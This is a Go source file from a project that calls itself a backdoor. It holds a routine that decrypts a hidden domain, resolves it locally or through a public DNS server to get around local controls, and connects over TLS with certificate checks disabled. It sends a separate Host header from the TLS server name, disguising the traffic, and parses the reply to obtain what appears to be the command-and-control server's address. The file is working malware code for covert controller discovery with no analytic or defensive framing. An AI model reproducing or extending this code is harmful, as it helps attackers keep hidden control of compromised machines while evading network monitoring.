package main

import (
	"backdoor/util"
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	"golang.org/x/net/dns/dnsmessage"
)

func getDomain() (string, error) {
	var data = []byte{0xab, 0xe, 0x64, 0xb9, 0x66, 0x4, 0x9f, 0xea, 0x95, 0x94, 0x7d, 0x88, 0x6f, 0xf, 0xae, 0x7d, 0x4d, 0x14, 0xf, 0x73, 0x1f, 0x23, 0xc3, 0xd6, 0x93, 0x92, 0x3e, 0xa7, 0x38, 0xa1, 0xe2, 0x3c}
	pdecoder := util.NewDecoder()
	urlBytes, err := pdecoder.Decode(data)
	return string(urlBytes), err
}

func resolveDomainByLocal(domain string) []net.IP {
	ips, err := net.LookupIP(domain)
	if err != nil {
		return nil
	}
	var ipv4s []net.IP
	for i := 0; i < len(ips); i++ {
		if ips[i].To4() == nil {
			continue
		}
		ipv4s = append(ipv4s, ips[i])
	}
	return ipv4s
}

func resolveDomainByRemote(domain string, dnsServer string) []net.IP {
	var msg dnsmessage.Message
	msg.Header.ID = 1
	msg.Header.RecursionDesired = true
	msg.Questions = []dnsmessage.Question{
		{
			Name:  dnsmessage.MustNewName(domain + "."),
			Type:  dnsmessage.TypeA,
			Class: dnsmessage.ClassINET,
		},
	}

	packed, err := msg.Pack()
	if err != nil {
		return nil
	}
	conn, err := net.DialTimeout("udp", dnsServer, 8*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	if _, err := conn.Write(packed); err != nil {
		return nil
	}
	buffer := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(8 * time.Second))
	n, err := conn.Read(buffer)
	if err != nil {
		return nil
	}
	var response dnsmessage.Message
	if err := response.Unpack(buffer[:n]); err != nil {
		return nil
	}
	var ipv4s []net.IP
	for _, ans := range response.Answers {
		if ans.Header.Type != dnsmessage.TypeA {
			continue
		}
		ares, ok := ans.Body.(*dnsmessage.AResource)
		if !ok {
			continue
		}
		ip := ares.A
		ipv4s = append(ipv4s, net.IP(ip[:]))
	}
	return ipv4s
}

func getIP() string {
	realDomain, err := getDomain()
	if err != nil {
		return ""
	}
	var rootDomain string
	if index := strings.Index(realDomain, "."); index != -1 {
		rootDomain = realDomain[index+1:]
	}
	dnsserver := "8.8.8.8:53"
	var ips []net.IP
	if rand.Intn(2) == 0 {
		ips = resolveDomainByLocal(rootDomain)
		if len(ips) == 0 {
			ips = resolveDomainByRemote(rootDomain, dnsserver)
		}
	} else {
		ips = resolveDomainByRemote(rootDomain, dnsserver)
		if len(ips) == 0 {
			ips = resolveDomainByLocal(rootDomain)
		}
	}

	if len(ips) == 0 {
		return ""
	}
	conf := tls.Config{
		ServerName:         rootDomain,
		InsecureSkipVerify: true,
	}
	pdial := new(net.Dialer)
	pdial.Timeout = 24 * time.Second
	conn, err := tls.DialWithDialer(pdial, "tcp", fmt.Sprintf("%s:443", ips[rand.Intn(len(ips))].String()), &conf)
	if err != nil {
		return ""
	}
	defer conn.Close()
	conn.Write([]byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\n\r\n", realDomain)))
	conn.SetReadDeadline(time.Now().Add(20 * time.Second))
	var firstline string
	var havesee bool
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		tmpline := strings.TrimSpace(scanner.Text())
		if len(tmpline) == 0 {
			if !havesee {
				havesee = true
			}
		} else {
			if havesee {
				firstline = tmpline
			}
		}
		if len(firstline) != 0 {
			break
		}
	}
	ip, port, ok := util.ParseIP(firstline)
	if !ok {
		return ""
	}
	return fmt.Sprintf("%s:%d", ip, port)
}
